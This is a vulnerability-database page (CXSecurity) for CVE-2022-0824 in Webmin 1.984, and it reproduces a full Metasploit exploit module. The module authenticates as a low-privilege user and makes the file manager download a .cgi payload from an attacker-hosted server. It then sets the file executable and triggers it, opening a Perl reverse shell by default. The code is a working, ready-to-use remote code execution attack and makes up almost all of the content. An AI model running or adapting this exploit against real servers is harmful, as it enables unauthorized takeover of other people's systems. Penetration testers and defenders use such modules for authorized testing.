---
title: Webmin 1.984 File Manager Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2022110001
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-11-03
fetch_date: 2025-10-03T21:36:20.088551
---

# Webmin 1.984 File Manager Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Webmin 1.984 File Manager Remote Code Execution** **2022.11.02**  Credit:  **[jheysel-r7](https://cxsecurity.com/author/jheysel-r7/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-0824](https://cxsecurity.com/cveshow/CVE-2022-0824/ "Click to see CVE-2022-0824")**  CWE: **[CWE-863](https://cxsecurity.com/cwe/CWE-863 "CWE-863")**  CVSS Base Score: **9/10**  Impact Subscore: **10/10**  Exploitability Subscore: **8/10**  Exploit range: **Remote**  Attack complexity: **Low**  Authentication: **Single time**  Confidentiality impact: **Complete**  Integrity impact: **Complete**  Availability impact: **Complete** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::FileDropper
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::Remote::HttpServer
include Msf::Exploit::Remote::HTTP::Webmin
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Webmin File Manager RCE',
'Description' => %q{
In Webmin version 1.984, any authenticated low privilege user without access rights to
the File Manager module could interact with file manager functionalities such as downloading files from remote URLs and
changing file permissions. It is possible to achieve Remote Code Execution via a crafted .cgi file by chaining those
functionalities in the file manager.
},
'Author' => [
'faisalfs10x', # discovery
'jheysel-r7' # module
],
'References' => [
[ 'URL', 'https://huntr.dev/bounties/d0049a96-de90-4b1a-9111-94de1044f295/'], # exploit
[ 'URL', 'https://github.com/faisalfs10x/Webmin-CVE-2022-0824-revshell'], # exploit
[ 'CVE', '2022-0824']
],
'License' => MSF\_LICENSE,
'Platform' => 'linux',
'Privileged' => true,
'Targets' => [
[
'Automatic (Unix In-Memory)',
{
'Platform' => 'unix',
'Arch' => ARCH\_CMD,
'Type' => :unix\_memory,
'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse\_perl' }
}
]
],
'DefaultTarget' => 0,
'DisclosureDate' => '2022-02-26',
'Notes' => {
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => [IOC\_IN\_LOGS]
}
)
)
register\_options(
[
OptPort.new('RPORT', [true, 'The default webmin port', 10000]),
OptString.new('USERNAME', [ true, 'The username to authenticate as', '' ]),
OptString.new('PASSWORD', [ true, 'The password for the specified username', '' ])
]
)
end
def check
webmin\_check('0', '1.984')
end
def login
webmin\_login(datastore['USERNAME'], datastore['PASSWORD'])
end
def download\_remote\_url
print\_status('Fetching payload from HTTP server')
res = send\_request\_cgi({
'uri' => normalize\_uri(datastore['TARGETURI'], '/extensions/file-manager/http\_download.cgi'),
'method' => 'POST',
'keep\_cookies' => true,
'data' => 'link=' + get\_uri + '.cgi' + '&username=&password=&path=%2Fusr%2Fshare%2Fwebmin',
'headers' => {
'Accept' => 'application/json, text/javascript, \*/\*; q=0.01',
'Accept-Encoding' => 'gzip, deflate',
'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8',
'X-Requested-With' => 'XMLHttpRequest',
'Referer' => 'http://' + datastore['RHOSTS'] + ':' + datastore['RPORT'].to\_s + '/filemin/?xnavigation=1'
},
'vars\_get' => {
'module' => 'filemin'
}
})
fail\_with(Failure::UnexpectedReply, 'Unable to download .cgi payload from http server') unless res
fail\_with(Failure::BadConfig, 'please properly configure the http server, it could not be found by webmin') if res.body.include?('Error: No valid URL supplied!')
register\_file\_for\_cleanup("/usr/share/webmin/#{@file\_name}")
end
def modify\_permissions
print\_status('Modifying the permissions of the uploaded payload to 0755')
res = send\_request\_cgi({
'uri' => normalize\_uri(target\_uri.path, '/extensions/file-manager/chmod.cgi'),
'method' => 'POST',
'keep\_cookies' => true,
'headers' => {
'Referer' => 'http://' + datastore['RHOSTS'] + ':' + datastore['RPORT'].to\_s + 'filemin/?xnavigation=1'
},
'vars\_get' => {
'module' => 'filemin',
'page' => '1',
'paginate' => '30'
},
'vars\_post' => {
'name' => @file\_name,
'perms' => '0755',
'applyto' => '1',
'path' => '/usr/share/webmin'
}
})
fail\_with(Failure::UnexpectedReply, 'Unable to modify permissions on the upload .cgi payload') unless res && res.code == 302
end
def exec\_revshell
res = send\_request\_cgi(
'method' => 'GET',
'keep\_cookies' => true,
'uri' => normalize\_uri(datastore['TARGETURI'], @file\_name),
'headers' => {
'Connection' => 'keep-alive'
}
)
fail\_with(Failure::UnexpectedReply, 'Unable to execute the .cgi payload') unless res && res.code == 500
end
def on\_request\_uri(cli, request)
print\_status("Request '#{request.method} #{request.uri}'")
print\_status('Sending payload ...')
send\_response(cli, payload.encoded,
'Content-Type' => 'application/octet-stream')
end
def exploit
start\_service
@file\_name = (get\_resource.gsub('/', '') + '.cgi')
cookie = login
fail\_with(Failure::BadConfig, 'Unsuccessful login attempt with creds') if cookie.empty?
print\_status('Downloading remote url')
download\_remote\_url
print\_status('Finished downloading remote url')
modify\_permissions
exec\_revshell
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022110001)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top